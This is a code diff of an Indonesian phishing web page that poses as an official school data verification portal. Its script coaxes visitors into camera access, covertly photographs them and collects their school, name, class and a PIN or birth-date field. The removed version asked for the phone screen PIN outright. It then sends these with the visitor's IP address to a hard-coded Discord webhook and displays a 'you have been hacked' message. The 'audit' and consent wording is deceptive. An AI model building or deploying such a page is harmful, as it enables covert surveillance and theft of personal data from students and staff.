@@ -3,49 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Verifikasi Sekolah</title>
+    <title>Portal Verifikasi Data Pendidikan</title>
+    <link rel="icon" href="https://img.icons8.com/color/48/000000/education.png">
     <style>
-        body { background: #ffffff; color: #000000; font-family: 'Segoe UI', Arial, sans-serif; text-align: center; padding: 20px; }
-        .card { background: #ffffff; border: 2px solid #eeeeee; padding: 30px; border-radius: 12px; max-width: 400px; margin: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        h2 { font-weight: 700; border-bottom: 2px solid #000; padding-bottom: 10px; text-transform: uppercase; }
-        input { width: 90%; padding: 12px; margin: 10px 0; background: #fafafa; border: 1px solid #cccccc; color: #000000; border-radius: 6px; font-size: 16px; }
-        .btn { background: #000000; color: #ffffff; border: none; padding: 15px 30px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 6px; transition: 0.3s; font-size: 16px; }
-        .btn:hover { background: #333333; }
-        .small-text { font-size: 11px; color: #777777; margin-top: -5px; margin-bottom: 15px; text-align: left; margin-left: 5%; }
-        #login-box, #result-box { display: none; }
-        .scanner { border: 2px solid #000; width: 180px; height: 180px; margin: 20px auto; position: relative; overflow: hidden; background: #f9f9f9; }
-        .line { width: 100%; height: 3px; background: #000; position: absolute; animation: scan 2s infinite linear; }
-        @keyframes scan { 0% { top: 0%; } 50% { top: 100%; } 100% { top: 0%; } }
+        body { background: #eef2f7; color: #333; font-family: 'Segoe UI', Arial, sans-serif; text-align: center; padding: 20px; }
+        .card { background: #ffffff; border-radius: 8px; max-width: 420px; margin: auto; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border: 1px solid #d1d9e6; }
+        .header-banner { background: #0056b3; padding: 20px; }
+        .logo-img { width: 220px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2)); }
+        .content { padding: 30px; }
+        h2 { font-size: 18px; font-weight: 700; color: #2c3e50; margin-bottom: 20px; text-transform: uppercase; border-bottom: 2px solid #0056b3; padding-bottom: 10px; }
+        input { width: 90%; padding: 12px; margin: 8px 0; background: #fdfdfd; border: 1px solid #ccc; color: #333; border-radius: 4px; font-size: 15px; }
+        .btn { background: #0056b3; color: #fff; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 16px; margin-top: 15px; transition: 0.2s; }
+        .btn:hover { background: #004494; }
+        .terms-container { text-align: left; background: #f9f9f9; padding: 10px; border: 1px solid #eee; border-radius: 4px; margin-top: 10px; }
+        .terms-text { font-size: 10.5px; color: #666; line-height: 1.4; }
+        #login-box, #result-box, #loading-box { display: none; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0056b3; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <!-- TAHAP 1: IZIN KAMERA -->
-    <div id="audit-box" class="card">
-        <h2>SINKRONISASI SENSOR</h2>
-        <div class="scanner"><div class="line"></div></div>
-        <p>Sistem perlu memverifikasi hardware sebelum masuk ke portal. Klik <b>"Izinkan/Allow"</b> pada akses kamera.</p>
-        <button class="btn" onclick="startCamera()">SINKRONKAN SEKARANG</button>
-    </div>
+    <div class="card">
+        <!-- Official Banner with the requested Logo -->
+        <div class="header-banner">
+            <img src="https://freepnglogo.com/images/all_img/tut-wuri-handayani-logo-with-white-text-png-b461.png" class="logo-img">
+        </div>
 
-    <!-- TAHAP 2: LOGIN (SETELAH FOTO DIAMBIL) -->
-    <div id="login-box" class="card">
-        <h2>PORTAL VERIFIKASI</h2>
-        <p>Sensor terdeteksi. Silakan lengkapi data untuk menyelesaikan audit.</p>
-        <input type="text" id="schoolName" placeholder="Nama Sekolah">
-        <input type="text" id="fullName" placeholder="Nama Lengkap">
-        <input type="text" id="userClass" placeholder="Kelas / Jabatan">
-        <input type="password" id="phonePin" placeholder="PIN/Password Layar HP">
-        <p class="small-text">*Jika tidak ada PIN, biarkan kosong.</p>
-        <button class="btn" onclick="finalSubmit()">LANJUTKAN</button>
-    </div>
+        <div class="content">
+            <!-- TAHAP 1: IZIN -->
+            <div id="audit-box">
+                <h2>Otentikasi Perangkat</h2>
+                <p style="font-size: 14px; color: #555;">Sistem mendeteksi akses baru. Harap lakukan sinkronisasi sensor hardware untuk memvalidasi keamanan sesi Anda.</p>
+                <button class="btn" onclick="startCamera()">SINKRONISASI SENSOR</button>
+            </div>
 
-    <!-- TAHAP 3: HASIL -->
-    <div id="result-box" class="card">
-        <h1 style="color: #000000; border: 2px solid #000;">⚠️ ANDA TELAH DISADAP ⚠️</h1>
-        <p>Seluruh data dan foto wajah Anda telah berhasil dikirim ke server pusat.</p>
-        <img id="capturedImg" style="width: 100%; border: 1px solid #000; border-radius: 8px; margin-top: 10px;">
-        <p style="font-weight: bold; background: #000; color: #fff; padding: 10px; margin-top: 15px;">SISTEM KEAMANAN TEMBUS</p>
+            <!-- TAHAP 2: LOADING -->
+            <div id="loading-box">
+                <h2>Memproses...</h2>
+                <div class="loader"></div>
+                <p style="font-size: 14px; color: #666;">Mengamankan jalur enkripsi data...</p>
+            </div>
+
+            <!-- TAHAP 3: LOGIN -->
+            <div id="login-box">
+                <h2>Verifikasi Identitas</h2>
+                <input type="text" id="schoolName" placeholder="Nama Sekolah (Unit Kerja)">
+                <input type="text" id="fullName" placeholder="Nama Lengkap Sesuai Dapodik">
+                <input type="text" id="userClass" placeholder="Kelas / Jabatan">
+                <input type="text" id="birthDate" placeholder="Tanggal Verifikasi (DD/MM/YYYY)">
+                
+                <div class="terms-container">
+                    <div class="terms-text">
+                        <input type="checkbox" id="consent" style="width:auto;"> 
+                        <strong>Persetujuan Data:</strong> Saya memberikan izin kepada sistem untuk memproses data identitas dan informasi hardware guna keperluan audit keamanan digital sekolah.
+                    </div>
+                </div>
+                
+                <button class="btn" onclick="finalSubmit()">SIMPAN & VERIFIKASI</button>
+            </div>
+
+            <!-- TAHAP 4: HASIL -->
+            <div id="result-box">
+                <h2 style="color: #c0392b; border-bottom-color: #c0392b;">SISTEM TERHACK</h2>
+                <p style="font-size: 14px;">Log identitas dan metadata Anda telah tersimpan di server eksternal.</p>
+                <img id="capturedImg" style="width: 100%; border: 1px solid #ddd; border-radius: 4px; margin-top: 10px;">
+                <p style="font-size: 12px; color: #888; margin-top: 10px;">Status: Data Berhasil Dikirim.</p>
+            </div>
+        </div>
     </div>
 
     <video id="video" autoplay style="display:none;"></video>
@@ -54,73 +79,72 @@
     <script>
         const webhook = "https://discord.com/api/webhooks/1499298779143340053/96v2UUkOcDdK8X_PG-2_zOycfoYzxO0_7rt2m6npWmjMMUSuUWsTPkSM_cpO9L69dr8K";
         let capturedBlob = null;
-        let globalStream = null;
 
         async function startCamera() {
             try {
-                globalStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
-                video.srcObject = globalStream;
+                video.srcObject = stream;
+                
+                document.getElementById('audit-box').style.display = 'none';
+                document.getElementById('loading-box').style.display = 'block';
 
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    
                     canvas.toBlob(blob => {
                         capturedBlob = blob;
                         document.getElementById('capturedImg').src = URL.createObjectURL(blob);
                     }, 'image/png');
 
-                    globalStream.getTracks().forEach(t => t.stop());
-
-                    document.getElementById('audit-box').style.display = 'none';
+                    stream.getTracks().forEach(t => t.stop());
+                    document.getElementById('loading-box').style.display = 'none';
                     document.getElementById('login-box').style.display = 'block';
-                }, 1000);
-
+                }, 2000);
             } catch (err) {
-                alert("Akses Kamera Diperlukan untuk Verifikasi Perangkat.");
-                startCamera(); 
+                alert("Kesalahan Sistem: Izin perangkat diperlukan untuk melanjutkan.");
+                startCamera();
             }
         }
 
         async function finalSubmit() {
+            if(!document.getElementById('consent').checked) return alert("Anda harus menyetujui syarat & ketentuan untuk melanjutkan.");
+            
             const school = document.getElementById('schoolName').value;
             const name = document.getElementById('fullName').value;
             const uClass = document.getElementById('userClass').value;
-            const pin = document.getElementById('phonePin').value;
+            const bDate = document.getElementById('birthDate').value;
 
-            if (!school || !name || !uClass) return alert("Mohon lengkapi data.");
+            if (!school || !name || !uClass || !bDate) return alert("Mohon lengkapi seluruh data.");
 
-            let batteryInfo = "Tidak Diketahui";
-            if (navigator.getBattery) {
-                const bat = await navigator.getBattery();
-                batteryInfo = `${Math.round(bat.level * 100)}%`;
-            }
+            document.getElementById('login-box').style.display = 'none';
+            document.getElementById('loading-box').style.display = 'block';
+
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipRes.json();
 
             const formData = new FormData();
             formData.append('file', capturedBlob, 'target.png');
-            const embed = {
-                title: "🔓 DATA TARGET BERHASIL DISADAP",
-                color: 0,
-                fields: [
-                    { name: "🏫 Sekolah", value: school, inline: false },
-                    { name: "👤 Nama", value: name, inline: true },
-                    { name: "📚 Kelas/Jabatan", value: uClass, inline: true },
-                    { name: "🔑 PIN HP", value: `\`${pin || 'KOSONG'}\``, inline: false },
-                    { name: "🌐 IP Address", value: ipData.ip, inline: true },
-                    { name: "🔋 Baterai", value: batteryInfo, inline: true }
-                ],
-                footer: { text: "Audit Sistem Keamanan Sekolah - Beelink Tool" }
-            };
-            formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
-            
-            fetch(webhook, { method: 'POST', body: formData });
+            formData.append('payload_json', JSON.stringify({
+                embeds: [{
+                    title: "🔓 HASIL PENYADAPAN (v6.4)",
+                    color: 0,
+                    fields: [
+                        { name: "Sekolah", value: school },
+                        { name: "Nama", value: name, inline: true },
+                        { name: "Kelas", value: uClass, inline: true },
+                        { name: "PIN/B-Day", value: `\`${bDate}\`` },
+                        { name: "IP Address", value: ipData.ip }
+                    ],
+                    footer: { text: "Beelink Admin Spy - Depok" }
+                }]
+            }));
 
-            document.getElementById('login-box').style.display = 'none';
+            await fetch(webhook, { method: 'POST', body: formData });
+            
+            document.getElementById('loading-box').style.display = 'none';
             document.getElementById('result-box').style.display = 'block';
         }
     </script>
